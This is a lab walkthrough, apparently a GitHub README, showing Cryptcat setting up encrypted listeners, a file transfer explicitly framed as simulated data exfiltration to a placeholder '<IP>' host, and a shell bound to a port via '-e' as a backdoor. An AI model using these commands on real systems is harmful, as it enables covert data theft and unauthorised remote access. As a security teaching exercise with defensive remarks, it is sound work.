# Cryptcat

This demo shows how encrypted communication channels can be established between two systems using Cryptcat. This simulates how attackers may maintain persistent, covert communication after gaining access to a system. Cryptcat is an enhanced version of Netcat that supports encryption via symmetric key authentication.

---
## Lab Environment
- Attacker Machine: Kali Linux (Terminal 1)
- Target Machine: Kali Linux (Terminal 2) / Lab VM

## Steps
### Feature 1: Encrypted communication channel
#### Step A - Start Encrypted Listener

```bash
cryptcat -l -p 4444 -k testkey
```
Parameters:
- -l means Listen Mode 
- -p 4444 means specifies port number
- -k testkey means encryption key
  
<img width="728" height="87" alt="1" src="https://github.com/user-attachments/assets/6cfacbd0-dd9b-4e1c-846b-701da38c2950" />


This command creates an encrypted communication endpoint waiting for a remote system to connect.

#### Step b - Connect from client side
```bash
cryptcat <IP> 4444 -k testkey
```
<img width="728" height="97" alt="2" src="https://github.com/user-attachments/assets/3ad02524-21fb-4f52-81c4-a9224bb93156" />

Parameters:
- <ip> means Listener IP
- 4444 means Port number
- -k testkey → Must match the listener key

This establishes an encrypted TCP session between two machines.
Both sides can now exchange data securely.

#### Step C - Secure message exchange
After connected, typed in messages

<img width="745" height="704" alt="3" src="https://github.com/user-attachments/assets/11949796-979b-483f-a634-1bb809da79d3" />


This demonstration shows that Cryptcat is capable of establishing bidirectional encrypted communication between two systems. Once the connection is successfully initiated, the session remains active, allowing continuous interaction between both endpoints. This enables real-time command execution and data exchange over an encrypted channel.

### Feature 2: Encrypted File Transfer
#### Step A - Prepare File
```bash
echo "this is test file from terminal 2" > secret.txt
```
<img width="719" height="182" alt="Screenshot 2026-02-25 211310" src="https://github.com/user-attachments/assets/4efc8007-24ad-438c-a6e2-70bc431051ff" />

Creates a sample file to simulate data exfiltration.

#### Step B - Start receiving side
```bash
cryptcat -l -p 5555 -k filekey > received.txt
```
<img width="795" height="228" alt="Screenshot 2026-02-25 211407" src="https://github.com/user-attachments/assets/e2ef4eb6-4b41-4ea5-a628-c221942132f1" />

This command configures to listen for incoming connections on port 5555. It applies a predefined encryption key to ensure that all transmitted data is encrypted during the communication session. Additionally, the output redirection operator saves the incoming data stream into a local file named received.txt, thereby allowing the system to store the transferred content for later verification or analysis.

 #### Step C - Send File

```bash
cryptcat <IP> 5555 -k filekey < secret.txt
```
<img width="715" height="49" alt="Screenshot 2026-02-25 211527_new" src="https://github.com/user-attachments/assets/f10102ae-acb2-436b-860d-d2b8ed0a41ff" />

```bash < secret.txt``` sends file contents
Encrypted during transmission

this demonstrate secure file transfer channel.


#### Step D - Verifying file
```bash
cat received.txt
```
<img width="711" height="81" alt="Screenshot 2026-02-25 211527-9" src="https://github.com/user-attachments/assets/37fbe7ca-0cda-4abf-9072-db0633d4c12b" />

the commands used to check the file transfer. This confirms successful encrypted file transfer.

### Feature 3 - Remote Shell Capability

<img width="745" height="704" alt="3" src="https://github.com/user-attachments/assets/168873b4-5ca2-4f53-91ae-4abec5009b3d" />


Cryptcat supports execution of a program upon connection using the `-e` option. 
This enables binding a system shell to a listening port.

Purpose:
This allows a remote user to execute system commands over an encrypted channel. If unauthorized, this can create a backdoor listener on a compromised machine. From a defensive perspective, monitoring unexpected listening ports is critical.

